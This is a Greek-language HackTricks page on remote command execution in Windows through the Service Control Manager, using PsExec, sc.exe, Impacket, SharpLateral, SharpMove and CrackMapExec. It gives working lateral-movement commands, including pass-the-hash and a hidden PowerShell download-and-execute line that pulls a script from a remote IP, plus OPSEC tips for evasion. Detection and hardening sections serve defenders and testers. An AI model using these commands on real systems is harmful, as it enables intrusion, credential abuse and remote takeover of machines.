# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Πώς λειτουργούν

Αυτές οι τεχνικές καταχρώνται απομακρυσμένα το Windows Service Control Manager (SCM) μέσω SMB/RPC, για να εκτελέσουν εντολές σε έναν host-στόχο. Η συνήθης ροή είναι:

1. Κάντε authenticate στον στόχο και αποκτήστε πρόσβαση στο share ADMIN$ μέσω SMB (TCP/445).
2. Αντιγράψτε ένα εκτελέσιμο αρχείο ή ορίστε μια γραμμή εντολών LOLBAS που θα εκτελέσει η υπηρεσία.
3. Δημιουργήστε απομακρυσμένα μια υπηρεσία μέσω SCM (MS-SCMR μέσω \PIPE\svcctl), η οποία θα δείχνει στην εντολή ή στο binary.
4. Εκκινήστε την υπηρεσία για να εκτελεστεί το payload και, προαιρετικά, καταγράψτε τα stdin/stdout μέσω ενός named pipe.
5. Διακόψτε την υπηρεσία και κάντε cleanup (διαγράψτε την υπηρεσία και τυχόν binaries που αντιγράφηκαν στον στόχο).

Απαιτήσεις/προϋποθέσεις:
- Local Administrator στον στόχο (SeCreateServicePrivilege) ή ρητά δικαιώματα δημιουργίας υπηρεσιών στον στόχο.
- Να είναι προσβάσιμο το SMB (445) και διαθέσιμο το share ADMIN$· να επιτρέπεται το Remote Service Management από το firewall του host.
- UAC Remote Restrictions: με τοπικούς λογαριασμούς, το token filtering μπορεί να εμποδίσει την πρόσβαση διαχειριστή μέσω δικτύου, εκτός αν χρησιμοποιείτε τον ενσωματωμένο λογαριασμό Administrator ή ορίσετε LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: η χρήση hostname/FQDN ενεργοποιεί το Kerberos· η σύνδεση μέσω IP συχνά οδηγεί σε fallback στο NTLM (και μπορεί να αποκλείεται σε hardened περιβάλλοντα).

### Χειροκίνητο ScExec/WinExec μέσω sc.exe

Το παρακάτω δείχνει μια ελάχιστη προσέγγιση δημιουργίας υπηρεσίας. Το image της υπηρεσίας μπορεί να είναι ένα EXE που αντιγράφηκε στον στόχο ή ένα LOLBAS όπως το cmd.exe ή το powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Σημειώσεις:
- Αναμένετε σφάλμα timeout κατά την εκκίνηση ενός EXE που δεν είναι service· η εκτέλεση πραγματοποιείται κανονικά.
- Για να είστε πιο OPSEC-friendly, προτιμήστε fileless εντολές (cmd /c, powershell -enc) ή διαγράψτε τα artifacts που αφήσατε.

Βρείτε αναλυτικότερα βήματα εδώ: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Εργαλεία και παραδείγματα

### Sysinternals PsExec.exe

- Κλασικό εργαλείο διαχείρισης που χρησιμοποιεί SMB για να αφήσει το PSEXESVC.exe στο ADMIN$, να εγκαταστήσει μια προσωρινή service (προεπιλεγμένο όνομα PSEXESVC) και να μεταφέρει I/O μέσω named pipes.
- Παραδείγματα χρήσης:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Μπορείτε να το εκκινήσετε απευθείας από το Sysinternals Live μέσω WebDAV:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Αφήνει συμβάντα εγκατάστασης/κατάργησης υπηρεσίας (το όνομα της υπηρεσίας είναι συχνά PSEXESVC, εκτός αν χρησιμοποιείται το -r) και δημιουργεί το C:\Windows\PSEXESVC.exe κατά την εκτέλεση.

### Impacket psexec.py (παρόμοιο με PsExec)

- Χρησιμοποιεί μια ενσωματωμένη υπηρεσία τύπου RemCom. Αποθέτει ένα προσωρινό δυαδικό αρχείο υπηρεσίας (συνήθως με τυχαιοποιημένο όνομα) μέσω του ADMIN$, δημιουργεί μια υπηρεσία (συχνά την προεπιλεγμένη RemComSvc) και προωθεί την είσοδο/έξοδο μέσω ενός named pipe.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Τεχνουργήματα
- Προσωρινό EXE στο C:\Windows\ (8 τυχαίοι χαρακτήρες). Το όνομα της υπηρεσίας είναι από προεπιλογή RemComSvc, εκτός αν παρακαμφθεί.

### Impacket smbexec.py (SMBExec)

- Δημιουργεί μια προσωρινή υπηρεσία που εκκινεί το cmd.exe και χρησιμοποιεί ένα named pipe για I/O. Συνήθως αποφεύγει την απόθεση ενός πλήρους EXE payload· η εκτέλεση εντολών είναι ημι-διαδραστική.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- Το [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) υλοποιεί διάφορες μεθόδους lateral movement, συμπεριλαμβανομένου του service-based exec.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- Το [SharpMove](https://github.com/0xthirteen/SharpMove) περιλαμβάνει τροποποίηση/δημιουργία υπηρεσιών για την απομακρυσμένη εκτέλεση μιας εντολής.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Μπορείτε επίσης να χρησιμοποιήσετε το CrackMapExec για εκτέλεση μέσω διαφορετικών backends (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC, ανίχνευση και artifacts

Τυπικά artifacts στον host/στο δίκτυο κατά τη χρήση τεχνικών τύπου PsExec:
- Security 4624 (Logon Type 3) και 4672 (Special Privileges) στον target για τον λογαριασμό admin που χρησιμοποιήθηκε.
- Συμβάντα Security 5140/5145 File Share και File Share Detailed που δείχνουν πρόσβαση στο ADMIN$ και δημιουργία/εγγραφή service binaries (π.χ., PSEXESVC.exe ή τυχαίο .exe 8 χαρακτήρων).
- **System** 7045 από το Service Control Manager για εγκατάσταση service στον target: ονόματα όπως PSEXESVC, RemComSvc ή προσαρμοσμένο όνομα (`-r` / `-service-name`). Αυτό αποδεικνύει ότι εγκαταστάθηκε ένα service, όχι ότι εκτελέστηκε το image του. Συσχετίστε τη χρονική σήμανση και τη διαδρομή του image με συμβάντα διεργασιών ή με μια αντίστοιχη εγγραφή service-image prefetch, όταν είναι διαθέσιμη.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) για το services.exe ή το image του service, 3 (Network Connect), 11 (File Create) στο C:\Windows\, 17/18 (Pipe Created/Connected) για pipes όπως \\.\pipe\psexesvc, \\.\pipe\remcom_* ή τυχαίες παραλλαγές.
- Artifact μητρώου για το Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 στον host του operator (αν δεν έχει κατασταλεί).

Ιδέες για threat hunting
- Ειδοποίηση για εγκαταστάσεις service όπου το ImagePath περιλαμβάνει cmd.exe /c, powershell.exe ή τοποθεσίες TEMP.
- Αναζήτηση δημιουργίας διεργασιών όπου το ParentImage είναι C:\Windows\PSEXESVC.exe ή όπου τα children του services.exe εκτελούνται ως LOCAL SYSTEM και εκτελούν shells.
- Επισήμανση named pipes που τελειώνουν σε -stdin/-stdout/-stderr ή σε γνωστά ονόματα pipe κλώνων του PsExec.

## Αντιμετώπιση συνηθισμένων προβλημάτων
- Access is denied (5) κατά τη δημιουργία services: δεν είστε πραγματικά local admin, ισχύουν UAC remote restrictions για local accounts ή υπάρχει προστασία EDR κατά της παραποίησης στη διαδρομή του service binary.
- The network path was not found (53) ή αποτυχία σύνδεσης στο ADMIN$: το firewall αποκλείει SMB/RPC ή τα admin shares είναι απενεργοποιημένα.
- Αποτυχία Kerberos ενώ το NTLM είναι αποκλεισμένο: συνδεθείτε με hostname/FQDN (όχι IP), βεβαιωθείτε ότι υπάρχουν τα σωστά SPNs ή δώστε -k/-no-pass μαζί με tickets όταν χρησιμοποιείτε Impacket.
- Λήξη χρονικού ορίου κατά την εκκίνηση του service, παρότι εκτελέστηκε το payload: αναμενόμενο αν δεν πρόκειται για πραγματικό service binary· καταγράψτε την έξοδο σε αρχείο ή χρησιμοποιήστε smbexec για ζωντανό I/O.

## Σημειώσεις για hardening
- Τα Windows 11 24H2 και Windows Server 2025 απαιτούν SMB signing από προεπιλογή για εξερχόμενες συνδέσεις (και εισερχόμενες στα Windows 11). Αυτό δεν εμποδίζει τη νόμιμη χρήση του PsExec με έγκυρα creds, αλλά αποτρέπει την κατάχρηση unsigned SMB relay και μπορεί να επηρεάσει συσκευές που δεν υποστηρίζουν signing.<sup>[[2]](#references)</sup>
- Η νέα δυνατότητα αποκλεισμού NTLM στον SMB client (Windows 11 24H2/Server 2025) μπορεί να εμποδίσει την εναλλακτική χρήση NTLM κατά τη σύνδεση μέσω IP ή σε servers χωρίς Kerberos. Σε περιβάλλοντα με ενισχυμένη ασφάλεια, αυτό θα εμποδίσει το PsExec/SMBExec που βασίζεται σε NTLM· χρησιμοποιήστε Kerberos (hostname/FQDN) ή ρυθμίστε εξαιρέσεις, αν απαιτείται για νόμιμη χρήση.<sup>[[2]](#references)</sup>
- Αρχή του ελάχιστου προνομίου: περιορίστε στο ελάχιστο τη συμμετοχή σε local admin, προτιμήστε Just-in-Time/Just-Enough Admin, επιβάλετε LAPS και παρακολουθείτε/ενεργοποιείτε ειδοποιήσεις για εγκαταστάσεις service 7045.

## Δείτε επίσης

- Απομακρυσμένη εκτέλεση μέσω WMI (συχνά με λιγότερα αρχεία):

{{#ref}}
./wmiexec.md
{{#endref}}

- Απομακρυσμένη εκτέλεση μέσω WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Ενίσχυση ασφάλειας SMB στα Windows Server 2025 και Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Χρήση διαπιστευτηρίων για την κατάληψη Windows Boxes - Μέρος 2 (PSExec και Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Αντιμετώπιση απρόσμενων επανεκκινήσεων με χρήση των system event logs](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
